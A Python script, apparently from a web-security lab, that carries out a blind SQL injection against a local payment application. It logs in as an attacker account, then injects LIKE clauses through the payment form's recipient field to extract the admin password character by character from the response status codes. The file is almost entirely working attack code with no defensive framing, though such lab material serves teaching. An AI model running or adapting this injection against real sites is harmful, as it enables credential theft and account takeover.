from requests import codes, Session
from string import ascii_letters

LOGIN_FORM_URL = "http://localhost:8080/login"
PAY_FORM_URL = "http://localhost:8080/pay"

def submit_login_form(sess, username, password):
    response = sess.post(LOGIN_FORM_URL,
                         data={
                             "username": username,
                             "password": password,
                             "login": "Login",
                         })
    return response.status_code == codes.ok

def submit_pay_form(sess, recipient, amount):
    response = sess.post(PAY_FORM_URL,
                    data={
                        "recipient": recipient,
                        "amount": amount,
                        "csrf-id": sess.id,
                    })
    print(response.status_code)                
    return response.status_code == codes.ok

def sqli_attack(username):
    
    sess = Session()
    assert(submit_login_form(sess, "attacker", "attacker"))
    pw = ''
    i = 0
    while i != len(ascii_letters):
        c = ascii_letters[i]
        strng = username + "' AND users.password LIKE '" + pw + c + "%' LIMIT 1 OFFSET 0--"
        print(strng)
        if (submit_pay_form(sess, strng, 0)):
            pw = pw + c
            i = -1
        i += 1
    
    pw = pw[0:len(pw)]
    print("Password is: " +pw)
    return(pw)


def main():
    sqli_attack("admin")

if __name__ == "__main__":
    main()
